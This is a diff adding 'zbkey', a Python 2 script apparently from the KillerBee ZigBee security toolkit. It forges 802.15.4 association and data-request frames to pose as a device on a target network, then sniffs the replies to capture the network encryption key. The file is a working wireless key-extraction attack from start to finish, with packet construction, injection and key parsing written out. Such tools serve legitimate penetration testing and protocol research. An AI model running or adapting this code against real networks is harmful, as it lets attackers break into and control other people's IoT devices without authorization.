@@ -1,0 +1,195 @@
+#!/usr/bin/env python
+
+import sys
+import signal
+import binascii
+import struct
+import time
+
+from killerbee import *
+
+def usage():
+    print >>sys.stderr, """
+zbkey: Attempts to retrieve a key by sending the associate request followed by the data request after association response
+       Example usage: ./zbkey -f 14 -s 0.1 -p aa1a -a 0fc8071c08c25100 -i [deviceid]
+
+Contributed by: mandar.satam@gmail.com
+Edited by:      ApiDo team (rmspeers)
+Version:        BETA
+
+Usage: ./zbkey -f [channel] -s 0.1 -p [PANID] -a [IEEE64bitaddress] -i [deviceid]
+    """
+dev_short_addr = None
+
+def show_dev():
+    '''Prints the list of connected devices to stdout.'''
+    kb = KillerBee()
+    print "Dev\tProduct String\tSerial Number"
+    for dev in kb.dev_list():
+        print "%s\t%s\t%s" % (dev[0], dev[1], dev[2])
+
+def interrupt(signum, frame):
+    '''Handles shutdown when a signal is received.'''
+    global kb
+    kb.close()
+    print "Exiting..."
+    sys.exit(0)
+
+def associate_response_handle(packet):
+    #TODO link to the correct part of the specification for this frame
+    '''
+    Handle the association response packet.
+    @arg  packet 
+    @type packet 
+    @return A string representing the device's short address in hex notation,
+            or none if the packet was not the length or type expected.
+    '''
+    print "Length of packet received in associate_handle: {0}".format(len(packet))
+    print kbutils.hexdump(packet)
+    if len(packet) > 21:
+        #TODO mark up what these offsets are
+        if packet[21] == '\x02':
+            dev_short_addr = packet[22:24]
+            return dev_short_addr
+    return None   
+
+
+def transport_response_handle(packet):
+    #TODO link to the correct part of the specification for this frame
+    '''
+    Handle the transport response packet.
+    @arg  packet 
+    @type packet 
+    @return A string representing the key in hex notation,
+            or none if the packet was not the length or type expected.
+    '''
+    print "Length of packet received in transport_handle: {0}".format(len(packet))
+    print kbutils.hexdump(packet)
+    if len(packet) > 19:
+    	if packet[19] == '\x05':
+        	key = packet[21:33]
+        	return key
+    return None
+
+
+# Command-line arguments
+arg_channel = None
+arg_devstring = None
+arg_sleep = 1
+arg_delay = 4
+
+# Parameters to build association packet
+arg_IEE64addr = None    #May be specified on command line
+arg_panID = None        #May be specified on command line
+ASSOC_SEQNUM = '\xc2'
+ASSOC_DST = '\x00\x00'
+ASSOC_SRC_PANID = '\xff\xff'
+ASSOC_ALLOC_ADDR = '\x84' #?
+assoc_packet = None
+
+# Parameters to build data packet
+ASSOC_DATA_SEQNUM = '\xc3'
+
+# key transport data arguments
+DATA_KEY_SEQNUM = '\xc4'
+
+# Command Line Processing
+while len(sys.argv) > 1:
+    op = sys.argv.pop(1)
+    if op == '-f':
+        arg_channel = int(sys.argv.pop(1))
+    if op == '-i':
+        arg_devstring = sys.argv.pop(1)
+    if op == '-h':
+        usage()
+        sys.exit(0)
+    if op == '-D':
+        show_dev()
+        sys.exit(0)
+    if op == '-s':
+        arg_sleep = float(sys.argv.pop(1))
+    if op == '-a':
+        arg_IEE64addr = binascii.unhexlify(sys.argv.pop(1))
+        #print "reverse_addr:%s" %(arg_IEE64addr[::-1])        
+    if op == '-p':
+        arg_panID = binascii.unhexlify(sys.argv.pop(1))
+        #print "reverse_panid:%s" %(str(struct.pack("<L",0x1aaa)))
+    if op == '-z':
+        arg_IEEEcoord = sys.argv.pop(1)
+    if op == '-y':
+        arg_IEEEdev = sys.argv.pop(1)
+
+if arg_channel == None:
+    print >>sys.stderr, "ERROR: Must specify a channel with -f"
+    usage()
+    sys.exit(1)
+if arg_panID == None:
+    print >>sys.stderr, "ERROR: Must specify a PAN ID"
+    usage()
+    sys.exit(1)
+if arg_IEE64addr == None or len(arg_IEE64addr) != 8:
+    print >>sys.stderr, "ERROR: Must specify a 64-bit address of the target"
+    usage()
+    sys.exit(1)
+
+kb = KillerBee(device=arg_devstring)
+signal.signal(signal.SIGINT, interrupt)
+kb.set_channel(arg_channel)
+start = time.time()
+
+#./zbkey -f 14 -R test1 -s 0.1 -p aa1a -a 0fc8071c08c25100 -i [deviceid]
+
+#TODO verify input args used as hex and convert to byte strings when parsing cmd line
+# Build the packet we use to request association
+assoc_packet = '\x23\xc8'+ASSOC_SEQNUM+arg_panID+ASSOC_DST+ASSOC_SRC_PANID+arg_IEE64addr+'\x01'+ASSOC_ALLOC_ADDR # associate packet 
+# Build the data packet sent after the association response is received
+data_assoc_packet  = '\x63\xc8'+ASSOC_DATA_SEQNUM+arg_panID+ASSOC_DST+arg_IEE64addr+'\x04' #data packet after association        
+
+# sent associate packet
+print "Assoc packet:"
+print kbutils.hexdump(assoc_packet)
+kb.inject(assoc_packet)
+
+time.sleep(0.5)
+# send data after association packet
+print "Data_Assoc packet:"
+print kbutils.hexdump(data_assoc_packet)
+kb.inject(data_assoc_packet)
+ 
+value = None   
+# receiving the association response and setting the device_short_address
+while (start+arg_delay > time.time()):		
+    # Does not block            
+    recvpkt = kb.pnext()            
+    # Check for empty packet (timeout) and valid FCS
+    if recvpkt != None and recvpkt['validcrc']:
+        print "Received frame" 
+        value = associate_response_handle(recvpkt['bytes'])
+        if value != None:
+            print "Short address: {0}".format(value)
+            kb.sniffer_off() # sniffer needs to be turned off
+            break
+
+#create data_key packet
+if value != None:
+    data_key_packet = '\x63\x88'+DATA_KEY_SEQNUM+arg_panID+ASSOC_DST+value+'\x04' # data packet after association response 
+    print "Data_Key packet:"
+    print kbutils.hexdump(data_key_packet)
+    kb.inject(data_key_packet)
+
+    start = time.time()
+    receivedKey = None
+    while (start+arg_delay > time.time()):
+        # Does not block 
+        recvpkt = kb.pnext() 
+        # Check for empty packet (timeout) and valid FCS
+        if recvpkt != None and recvpkt['validcrc']:
+            receivedKey = transport_response_handle(recvpkt['bytes']) 
+            if receivedKey != None:
+                print "Received key: {:x}".format(receivedKey) 
+                kb.sniffer_off()
+                sys.exit(1)  
+                break
+
+kb.close()
+
